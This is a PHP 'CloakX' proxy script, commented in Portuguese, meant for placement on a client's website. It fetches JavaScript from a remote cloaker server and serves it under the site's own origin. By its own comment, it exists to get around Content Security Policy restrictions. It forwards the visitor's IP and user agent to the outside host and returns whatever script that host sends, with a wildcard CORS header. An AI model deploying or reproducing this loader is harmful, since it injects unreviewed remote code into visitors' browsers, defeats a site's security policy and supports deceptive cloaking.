<?php
/**
 * CloakX Proxy Script
 * Este arquivo deve ser colocado no site do cliente para contornar restrições de CSP
 * Versão: 1.0
 */

header('Content-Type: application/javascript');
header('Access-Control-Allow-Origin: *');

// Capturar o token da URL
$token = isset($_GET['key']) ? $_GET['key'] : '';

if (empty($token)) {
    echo "console.error('CloakX: Token não fornecido');";
    exit;
}

// URL do servidor CloakX
$cloakx_url = 'https://acessaragora.digital/cloaker/index.php?key=' . urlencode($token);

// Adicionar informações do visitante
$visitor_data = [
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'ref' => $_SERVER['HTTP_REFERER'] ?? '',
    'path' => $_SERVER['REQUEST_URI'] ?? '/'
];

// Adicionar parâmetros UTM se existirem
foreach (['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'] as $param) {
    if (isset($_GET[$param])) {
        $visitor_data[$param] = $_GET[$param];
    }
}

// Fazer requisição ao servidor CloakX
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $cloakx_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, $visitor_data['ua']);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'X-Forwarded-For: ' . $visitor_data['ip'],
    'X-Real-IP: ' . $visitor_data['ip']
]);

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code === 200) {
    echo $response;
} else {
    echo "console.error('CloakX: Erro ao conectar com o servidor');";
}
?>
